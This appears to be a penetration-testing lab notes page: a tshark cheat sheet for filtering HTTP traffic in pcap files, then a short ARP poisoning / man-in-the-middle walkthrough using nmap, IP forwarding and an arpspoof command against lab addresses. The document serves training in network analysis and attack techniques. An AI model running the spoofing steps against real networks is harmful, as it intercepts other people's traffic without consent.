# Labs

## Tshark

**Tshark is the command line version of Wireshark**

{% code overflow="wrap" lineNumbers="true" %}
```bash
tshark -v #Returns the version of Tshark
tshark -h #Returns the help menu
tshark -r <PCAPfile> #Display the results of a .pcap file
tshark -r <PCAPfile> -z io,phs -q #Return statistics about frames and protocols hierarchy

# Filtering Basics

# getting the OS (operating system) info of a src ip addr
tshark -r <pcap_file> -Y "ip.src==192.168.1.1 && http" -Tfields -e http.user_agent

tshark -r HTTP_traffic.pcap -Y 'http' #Filter results to get only traffic of HTTP service (can work with other services as well)
tshark -r HTTP_traffic.pcap -Y 'ip.src==<sourceIP> && ip.dst==<destinationIP>' #Filter result to get only traffic bewteen two IPs
tshark -r HTTP_traffic.pcap -Y 'http.request.method==GET' # all GET requests.
tshark -r HTTP_traffic.pcap -Y 'http.request.method==GET' -Tfields -e frame.time -e ip.src -e http.request.full_uri # filter by time, src ip, and url.

# display 1st 100 packets
tshark -r HTTP_traffic.pcap -c 100 

# list all interfaces supported by tshark
tshark -D

# sniff on a particular interface
tshark -i




# Here we deceive the client into thinking we are the server, and also deceive the server into thinking we are the client.
```
{% endcode %}

### ARP Poisoning / MITM attack

{% code overflow="wrap" lineNumbers="true" %}
```bash

# step 1
# discover host in the network.
nmap 192.168.0.1/24 # scan the network and discover the server and client you want to deceive.

# step 2
# convert kali into a router, so it can start sniffing packets.
echo 1 > /proc/sys/net/ipv4/ip_forward

# step 3
# run the attack with arpspoof utility.
# arpspoof -i <interface> -t <target_Client_IP> -r <target_Server_IP> # Perform an ARP spoofing attack
arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
```
{% endcode %}

